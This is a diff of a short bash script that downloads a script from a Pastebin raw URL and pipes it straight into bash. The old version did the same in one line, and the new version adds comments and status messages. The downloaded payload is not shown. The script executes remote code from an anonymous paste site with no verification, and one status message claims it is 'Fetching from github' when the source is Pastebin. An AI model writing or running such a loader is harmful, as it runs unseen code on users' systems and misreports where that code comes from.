@@ -1,1 +1,21 @@
-bash <(curl -fsSL https://pastebin.com/raw/90cjvEut | sed 's/\r$//')
+#!/bin/bash
+# This script fetches and executes another script from Pastebin.
+
+echo "Fetching from github..."
+SCRIPT_URL="https://pastebin.com/raw/rdTbepbe" 
+
+# Fetch the script, attempt to fix Windows line endings, and then execute it
+# The -sS options for curl are: -s (silent) and -S (show error on silent)
+# The -L option follows redirects, which is good practice for curl.
+# The -f option makes curl fail silently on server errors (HTTP 4xx or 5xx).
+if downloaded_script=$(curl -fsSL "$SCRIPT_URL"); then
+    echo "Executing downloaded script..."
+    echo "-----------------------------------------------------"
+    # Pipe the downloaded content (with potential line ending fix) to bash
+    echo "$downloaded_script" | sed 's/\r$//' | bash
+    echo "-----------------------------------------------------"
+    echo "Pastebin script execution finished."
+else
+    echo "❌ Error: Failed to download script from $SCRIPT_URL"
+    exit 1
+fi
